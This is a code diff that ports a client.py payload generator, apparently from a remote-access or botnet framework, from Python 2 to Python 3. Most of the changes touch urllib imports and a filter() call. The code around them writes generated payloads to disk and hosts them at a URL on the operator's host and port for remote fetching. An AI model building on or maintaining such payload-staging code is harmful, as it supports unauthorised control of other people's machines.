@@ -82,8 +82,13 @@ import sys
 import zlib
 import base64
 import random
-import urllib
-import urllib2
+if sys.version_info[0] < 3:
+    from urllib2 import urlparse
+    from urllib import pathname2url
+else:
+    from urllib import parse as urlparse
+    from urllib.request import pathname2url
+    sys.path.append('core')
 import marshal
 import argparse
 import itertools
@@ -93,6 +98,7 @@ import threading
 import colorama
 
 # modules
+
 import core.util as util
 import core.security as security
 import core.generators as generators
@@ -119,7 +125,7 @@ def main():
     Run the generator
 
     """
-    util.display(globals()['__banner'], color=random.choice(filter(lambda x: bool(str.isupper(x) and 'BLACK' not in x), dir(colorama.Fore))), style='normal')
+    util.display(globals()['__banner'], color=random.choice(list(filter(lambda x: bool(str.isupper(x) and 'BLACK' not in x), dir(colorama.Fore)))), style='normal')
 
     parser = argparse.ArgumentParser(
         prog='client.py',
@@ -326,9 +332,9 @@ def _payload(options, **kwargs):
         with open(path, 'w') as fp:
             fp.write(payload)
 
-        s = 'http://{}:{}/{}'.format(options.host, int(options.port) + 1, urllib.pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
-        s = urllib2.urlparse.urlsplit(s)
-        url = urllib2.urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')
+        s = 'http://{}:{}/{}'.format(options.host, int(options.port) + 1, pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
+        s = urlparse.urlsplit(s)
+        url = urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')
 
     __load__.set()
     util.display("(hosting payload at: {})".format(url), color='reset', style='dim')
